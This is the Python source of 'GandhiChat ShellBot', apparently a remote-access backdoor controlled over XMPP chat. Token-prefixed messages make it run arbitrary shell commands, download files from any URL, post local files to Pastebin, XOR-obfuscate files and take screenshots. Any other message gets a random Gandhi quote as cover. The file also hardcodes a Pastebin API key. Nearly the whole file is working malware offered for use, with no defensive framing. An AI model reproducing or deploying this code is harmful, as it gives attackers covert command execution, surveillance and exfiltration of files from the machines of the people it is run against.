#!/usr/bin/env python
# -*- coding: utf-8 -*-

# GandhiChat ShellBot v0.6
# Code borrowed from SleekXMPP's MUCBot and Sentynel's Pastebin script
# https://github.com/fritzy/SleekXMPP/blob/develop/examples/muc.py
# https://sentynel.com/project/Pastebin_Script

import time, random
import sys, os, subprocess
import logging
import getpass
import urllib2, urllib
from optparse import OptionParser
import sleekxmpp
import pyscreenshot as ImageGrab

# Requires a Google account user name that allows less secure apps.
# https://www.google.com/settings/security/lesssecureapps

USERNAME = 'example@gmail.com'
CMD_TOKEN = '$'
DWNLD_TOKEN = '!'
UPLD_TOKEN = '^'
XOR_TOKEN = '%'
SCRN_TOKEN = '&'

SERVICE_DISCOVERY = 'xep_0030'
MULTIUSER_CHAT = 'xep_0045'
XMPP_PING = 'xep_0199'

#Pastebin varriables
devkey = "6c71766cdadff9f33347e80131397ac2"

#The default byte array if one is not specified
hardcoded_bytearray= "de ad 13 37"

#Gandhi Version 
MESSAGES = ['I fear no one on Earth.', 'I follow God.', 'I bear no ill will toward anyone.', 'I will not submit to injustice.', 'I will conquer untruth with truth.', 'I will put up with suffering.', 'Be the change you wish to see.', 'My life is my message', 'Live as though you would die today.', 'Learn as though you would live forever.', 'Continue to grow and evolve.',]
#SHELLCHAT = ''
#SHELLNIC = ''

if sys.version_info < (3, 0):
  reload(sys)
  sys.setdefaultencoding('utf8')
else:
  raw_input = input

class MUCBot(sleekxmpp.ClientXMPP):

  def __init__(self, jid, password, xor_var):  # , room, nick):
    sleekxmpp.ClientXMPP.__init__(self, jid, password)
    #self.room = room
    #self.nick = nick
    self.xor_var = bytearray(self.hexToByte(xor_var))

    # The session_start event will be triggered when the bot connects to the server
    self.add_event_handler("session_start", self.start)

    #The message event is triggered whenever you are sent a message
    self.add_event_handler("message", self.message)

    # The groupchat_message event
    #self.add_event_handler("groupchat_message", self.muc_message)

    # The groupchat_presence event is triggered whenever someone joins a room
    #self.add_event_handler("muc::%s::got_online" % self.room, self.muc_online)

  # session_start event
  def start(self, event):
    self.get_roster()
    self.send_presence()
    #Don't join groupchat yet
    #self.plugin[MULTIUSER_CHAT].joinMUC(self.room, self.nick,
    #  password=room_password, wait=True)

  # reply to messages
  def message(self, msg):
    if msg['type'] in ('chat', 'normal'):
      body = msg['body']
      # Execute and respond to $command instructions
      if body and body[0] == CMD_TOKEN:
        reply = self.run_command(body.lstrip(CMD_TOKEN))
        msg.reply(reply).send()
        return
      # Execute and respond to !download instructions
      if body and body[0] == DWNLD_TOKEN:
        self.download(body.lstrip(DWNLD_TOKEN))
        savedToMsg = "file saved to: {}".format(
          body.lstrip(DWNLD_TOKEN).split('/')[-1])
        msg.reply(savedToMsg).send()
        return
      # Execute and respond to the ^upload instruction
      if body and body[0] == UPLD_TOKEN:
        reply = self.upload(body.lstrip(UPLD_TOKEN))
        msg.reply("file posted to: "+reply).send()
        return
      # Execute and respond to the %xor instruction  
      if body and body[0] == XOR_TOKEN:
        file_name = format(body.lstrip(XOR_TOKEN).split('/')[-1])
        self.xor(file_name, file_name+".new", self.xor_var)
        msg.reply("file saved as "+file_name+".new").send()
        return
      # Execute and respond to the &screenshot instruction  
      if body and body[0] == SCRN_TOKEN:
        file_name = format(body.lstrip(SCRN_TOKEN))
        ImageGrab.grab_to_file(file_name+".png")
        msg.reply("screenshot saved as "+file_name+".png").send()
        return
      # Default response if no special tokens were given
      time.sleep(random.uniform(0.4, 2.45))
      reply = random.choice(MESSAGES)
      msg.reply(reply).send()

  # reply to nick_name mentions
  def muc_message(self, msg):
    if msg['mucnick'] != self.nick and self.nick in msg['body']:
      self.send_message(mto=msg['from'].bare,
                        mbody="I heard that, %s." % msg['mucnick'],
                        mtype='groupchat')

  # Announce when bot comes online
  def muc_online(self, presence):
    if presence['muc']['nick'] != self.nick:
      self.send_message(mto=presence['from'].bare,
                        mbody="Hello, %s %s" % (presence['muc']['role'],
                                                presence['muc']['nick']),
                        mtype='groupchat')

  # Essential shell functionality
  def run_command(self, cmd):
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
      stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdoutput = proc.stdout.read() + proc.stderr.read()
    return stdoutput

  # Grab our file from some url and save it to a file
  def download(self, url):
    req = urllib2.Request('%s' % (url))
    message = urllib2.urlopen(req)
    filename = url.split('/')[-1] #Keep file name consistent w/ file downloaded
    localFile = open(filename, 'w')
    localFile.write(message.read())
    localFile.close()

  # Make paste request
  def upload(self, filename):
    localFile = open(filename, 'r')
    fi = localFile.read()
    localFile.close()
    target = {"api_paste_code":"".join(fi), "filename":"stdin"}
    target["api_dev_key"] = devkey
    target["api_option"] = "paste"
    try:
      req = urllib2.urlopen("http://pastebin.com/api/api_post.php", urllib.urlencode(target))
    except urllib2.URLError:
      print "Error uploading", filename + ":", "Network error"
      exit(2)
    else:
      reply = req.read()
      if "Bad API request" in reply:
        print "Error uploading", filename + ":", reply
        exit(2)
      else:
        return reply

  # XOR file w/ bytes
  def xor(self, orginal_file, new_file, xor_var):
    l = len(xor_var)
    data = bytearray(open(orginal_file, 'rb').read())
    result = bytearray((
      (data[i] ^ xor_var[i % l]) for i in range(0,len(data))
    ))
    localFile = open(new_file, 'w')
    localFile.write(result)
    localFile.close()

  # Helper function for XOR
  def hexToByte(self, hexStr):
    bytes = []
    hexStr = ''.join( hexStr.split(" ") )
    for i in range(0, len(hexStr), 2):
      bytes.append( chr( int (hexStr[i:i+2], 16 ) ) )
    return bytes    


def main():
  # Setup the command line arguments.
  optp = OptionParser()

  # Output verbosity options
  optp.add_option('-q', '--quiet', help='set logging to ERROR',
                  action='store_const', dest='loglevel',
                  const=logging.ERROR, default=logging.INFO)
  optp.add_option('-d', '--debug', help='set logging to DEBUG',
                  action='store_const', dest='loglevel',
                  const=logging.DEBUG, default=logging.INFO)
  optp.add_option('-v', '--verbose', help='set logging to COMM',
                  action='store_const', dest='loglevel',
                  const=5, default=logging.INFO)

  # JID and password options
  optp.add_option("-j", "--jid", dest="jid",
                  help="JID to use")
  optp.add_option("-p", "--password", dest="password",
                  help="password to use")
  optp.add_option("-x", "--hex", dest="xor_var",
                  help="Hex vals (seperated by a space) to XOR with, turns into a byte array ") 
  #optp.add_option("-r", "--room", dest="room",
  #                help="MUC room to join")
  #optp.add_option("-n", "--nick", dest="nick",
  #                help="MUC nickname")

  opts, args = optp.parse_args()

  # Setup logging.
  logging.basicConfig(level=opts.loglevel,
                      format='%(levelname)-8s %(message)s')

  if opts.jid is None:
    if USERNAME:
      opts.jid = USERNAME
    else:
      raise Exception("Username not set: use -j to set it.")
  if opts.password is None:
    opts.password = getpass.getpass("Password: ")
  if opts.xor_var is None:
    opts.xor_var = hardcoded_bytearray
  #if opts.room is None:
  #    opts.room = raw_input("MUC room: ")
  #    opts.room = SHELLCHAT
  #if opts.nick is None:
  #    opts.nick = raw_input("MUC nickname: ")
  #    opts.nick = SHELLNIC

  # Setup the MUCBot and register plugins.
  xmpp = MUCBot(opts.jid, opts.password, opts.xor_var) #, opts.room, opts.nick)
  xmpp.register_plugin(SERVICE_DISCOVERY) # Service Discovery
  xmpp.register_plugin(MULTIUSER_CHAT) # Multi-User Chat
  xmpp.register_plugin(XMPP_PING) # XMPP Ping

  # Connect to the XMPP server and start processing XMPP stanzas.
  if xmpp.connect():
    #if xmpp.connect(('talk.google.com', 5222)):
    xmpp.process(block=True)
    print("Done")
  else:
    print("Unable to connect.")


if __name__ == '__main__':
  main()
